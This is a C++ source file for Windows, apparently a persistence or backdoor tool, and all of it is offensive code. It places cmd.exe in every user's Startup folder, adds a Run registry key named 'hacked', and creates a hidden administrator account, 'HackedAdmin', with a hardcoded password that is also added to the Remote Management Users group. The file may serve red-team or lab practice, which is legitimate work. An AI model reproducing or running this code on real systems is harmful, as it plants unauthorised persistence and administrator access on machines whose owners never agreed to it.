#include <iostream>
#include <windows.h>
#include <string.h>
#include <lm.h>
#include <filesystem>
#include <stdlib.h>
#include <lmaccess.h>

// g++ Qliphoth.cpp -o Qliphoth.exe -lnetapi32

#pragma comment(lib, "netapi32.lib")

namespace fs = std::filesystem;



// Place a "reverse shell" into everyones startup folder
int startupFolder() {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    fs::path sourceFile = "C:\\Windows\\System32\\cmd.exe";
    fs::path targetFolder = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\";
    auto target = targetFolder / sourceFile.filename(); // This will extrapolate the file from the sourceFile path

    try {
        fs::copy_file(sourceFile, target, fs::copy_options::overwrite_existing);
        SetConsoleTextAttribute(hConsole, 2);
        std::cout << "Successfully wrote file to Startup Folder" << std::endl;
        SetConsoleTextAttribute(hConsole, 15);
    } catch (std::exception& e) {
        std::cout << e.what();
    }
    
    return 0;
} 



// Open and Create a subkey entry under the Run key
int createRunKey() {
    HKEY hKey = NULL;
    const char* exe = "C:\\Windows\\System32\\cmd.exe";
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

    LONG res = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_ALL_ACCESS,
        &hKey
    );

    if (res == ERROR_SUCCESS) {
        SetConsoleTextAttribute(hConsole, 2);
        std::cout << "Successfully opened key, writing now..." << std::endl;
        SetConsoleTextAttribute(hConsole, 15);

        LONG res2 = RegSetValueExA(
            hKey,
            (LPCSTR)"hacked",
            0,
            REG_SZ,
            (unsigned char*)exe,
            strlen(exe)
        );
        if (res2 == ERROR_SUCCESS) {
            SetConsoleTextAttribute(hConsole, 2);
            std::cout << "Successfully wrote key, closing key now..." << std::endl;
            SetConsoleTextAttribute(hConsole, 15);
        } else {
            SetConsoleTextAttribute(hConsole, 4);
            std::cout << "Failed with code: " << res << std::endl;;
            SetConsoleTextAttribute(hConsole, 15);
        }
        RegCloseKey(hKey);
    } else {
        SetConsoleTextAttribute(hConsole, 4); 
        std::cout << "Failed with code: " << res << std::endl;;
        SetConsoleTextAttribute(hConsole, 15);
    }

    return 0;
}



// Create, and add a user to Administrators and RDP group
int createUser() {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    USER_INFO_1 ui;
    const wchar_t* username = L"HackedAdmin";
    const wchar_t* password = L"HackedPassword";
    DWORD dwError = 0;
    SID_NAME_USE pe;

    // Create the User Information Struct
    ui.usri1_name = (wchar_t*)username;
    ui.usri1_password = (wchar_t*)password;
    ui.usri1_password_age = 365;        // This is ignored by NetUserAdd
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT;
    ui.usri1_script_path = NULL;

    // Add the user
    NetUserAdd(
        NULL,
        1,
        (LPBYTE)&ui,
        &dwError
    );

    if (dwError == NERR_Success) {
        SetConsoleTextAttribute(hConsole, 2);
        std::cout << "Successfully added HackedAdmin user, now attempting to add them to Administrators & Remote Management Users Group" << std::endl;
        SetConsoleTextAttribute(hConsole, 15);

        // Add User to "Remote Management Users" group. The non plural version of this function is "obsolete". You can use type 3 even without a domain.
        LOCALGROUP_MEMBERS_INFO_3 account;
        account.lgrmi3_domainandname = ui.usri1_name;
        LONG res2 = NetLocalGroupAddMembers(
            NULL,
            L"Remote Management Users",
            3,
            (LPBYTE)&account,
            1
        );

        if (res2 == ERROR_SUCCESS) {
            SetConsoleTextAttribute(hConsole, 2);
            std::cout << "Successfully added " << *ui.usri1_name << " to the Remote Management Users Group" << std::endl;
            SetConsoleTextAttribute(hConsole, 15);

        } else if (res2 == 1378) {
            SetConsoleTextAttribute(hConsole, 6);
            std::cout << "The User " << *ui.usri1_name << " is already a member of the Remote Management Users Group" << std::endl;
            SetConsoleTextAttribute(hConsole, 15);
        } else {
            SetConsoleTextAttribute(hConsole, 4);
            std::cout << "Failed with code: " << res2 << std::endl;;
            SetConsoleTextAttribute(hConsole, 15);
        }

        // Add to Administrators group. Can reuse the account and username variables but change the long string.
        LONG res3 = NetLocalGroupAddMembers(
            NULL,
            L"Administrators",
            3,
            (LPBYTE)&account,
            1
        );

        if (res3 == ERROR_SUCCESS) {
            SetConsoleTextAttribute(hConsole, 2);
            std::cout << "Successfully added " << *ui.usri1_name << " to the Administrators Group" << std::endl;
            SetConsoleTextAttribute(hConsole, 15);

        } else if (res3 == 1378) {
            SetConsoleTextAttribute(hConsole, 6);
            std::cout << "The User " << *ui.usri1_name << " is already a member of the Administrators Group" << std::endl;
            SetConsoleTextAttribute(hConsole, 15);
        } else {
            SetConsoleTextAttribute(hConsole, 4);
            std::cout << "Failed with code: " << res3 << std::endl;;
            SetConsoleTextAttribute(hConsole, 15);
        }

    } else {
        SetConsoleTextAttribute(hConsole, 4);
        std::cout << "Failed with code: " << dwError << std::endl;;
        SetConsoleTextAttribute(hConsole, 15);
    }
    return 0;
}



int main() {
    startupFolder();
    createRunKey();
    createUser();
    return 0;
}

// Useful error code knowledge: https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes